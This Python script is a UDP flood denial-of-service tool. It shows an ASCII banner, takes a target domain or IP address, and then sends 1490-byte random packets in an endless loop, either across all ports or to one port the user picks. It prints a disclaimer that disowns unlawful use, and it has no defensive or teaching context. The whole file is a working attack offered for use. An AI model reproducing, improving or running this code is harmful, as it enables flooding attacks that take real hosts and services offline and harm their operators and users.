""" Copyright (c) 2024-2025 Code Predator (codepredatoramf@gmail.com)
 
Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt or copy at [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT)) """

# Import necessary modules
from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet

# Version
version = "1.2"

# Detect platform
uname = system()

# Clear command based on OS
if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

# Clear Terminal
os.system(cmd_clear)

# Print Blue Colored Border with Normal Inner Text
print("\033[94m")  # Start Blue color for the border
print(".----------------.  .----------------.  .----------------. ")
print("| \033[0m.--------------. \033[94m|| .--------------. || .--------------. |")  # Reset color for inner text
print("| |      __      | || |     ______   | || |    _______   | |")
print("| |     /  \     | || |   .' ___  |  | || |   /  ___  |  | |")
print("| |    / /\ \    | || |  / .'   _|  | || |  |  (__ _|  | |")
print("| |   / ____ \   | || |  | |         | || |   '.***`-.   | |")
print("| | _/ /    \ \_ | || |  \ `.***.'\  | || |  |`\____) |  | |")
print("| ||____|  |____|| || |   `._____.'  | || |  |_______.'  | |")
print("| |              | || |              | || |              | |")
print("| '--------------' || '--------------' || '--------------' |")
print(" '----------------'  '----------------'  '----------------' ")
print("\033[0m")  # End Blue color

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Main menu
while True:
    print("\n\033[92;1m")
    print("                        Author: Code Predator")
    print('TEAM ACS bears no responsibility for any unlawful actions performed using this tool.')
    print('Users are solely accountable for their activities.')
    print("\n1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

    # User input
    opt = input("\n> ")

    if opt == '1':
        domain = input("Domain: ")
        ip = socket.gethostbyname(domain)
        break
    elif opt == '2':
        ip = input("IP Address: ")
        break
    elif opt == '3':
        print("\n\033[92mThis toolkit is created by Code Predator.\033[0m")
        print("\033[92mYou can connect with me on my Telegram ID: \033[96mcode_predator_amf\033[0m")
        print("\033[92mMy Facebook ID: \033[96mCode Predator\033[0m")
        print("\033[92mOr join our public group: \033[96mACS Community\033[0m")
        input("\nPress Enter to continue...")
        os.system(cmd_clear)
    elif opt == '4':
        exit()
    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection
port_mode = False
port = 2

while True:
    port_bool = input("Certain port? [y/n]: ").lower()
    if port_bool == "y":
        port_mode = True
        port = int(input("Port: "))
        break
    elif port_bool == "n":
        break
    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)

# Attack initializing
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....\033[0m')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

# Start Attack
if not port_mode:
    try:
        while True:
            if port >= 65534:
                port = 1
            elif port == 1900:
                port = 1901
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port: %s\033[0m" % (sent, ip, port))
    except KeyboardInterrupt:
        print('\n\033[31;1mExited by user\033[0m')

else:
    if port < 2 or port >= 65534:
        port = 2
    elif port == 1900:
        port = 1901
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port: %s\033[0m" % (sent, ip, port))
    except KeyboardInterrupt:
        print('\n\033[31;1mExited by user\033[0m')